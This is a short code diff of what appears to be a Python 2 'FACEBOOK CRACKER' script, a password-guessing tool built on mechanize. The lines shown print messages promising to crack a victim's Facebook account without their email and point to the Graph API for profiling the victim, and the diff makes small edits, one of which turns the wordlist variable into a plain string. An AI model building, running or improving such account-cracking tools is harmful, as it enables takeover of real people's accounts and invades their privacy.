@@ -9,7 +9,7 @@ import sys
 import random
 import mechanize
 import cookielib
-GHT = "FACEBOOK CRACKER"
+GHT = ("FACEBOOK CRACKER")
 print ("Note: - This tool can crack facebook account even if you don't have the email of your victim")
 print ("# Hit CTRL+C to quit the program")
 print ("# Use www.graph.facebook.com for more infos about your victim ^_^")
@@ -17,7 +17,7 @@ print ("# Use www.graph.facebook.com for more infos about your victim ^_^")
   
 email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
 
-passwordllist = temp.PASSWD
+passwordlist = 'temp.PASSWD'
 #uncomment the bellow line if you want to import a wordlist
 #passwordlist = str(raw_input("Enter the name of the password list file : "))
   
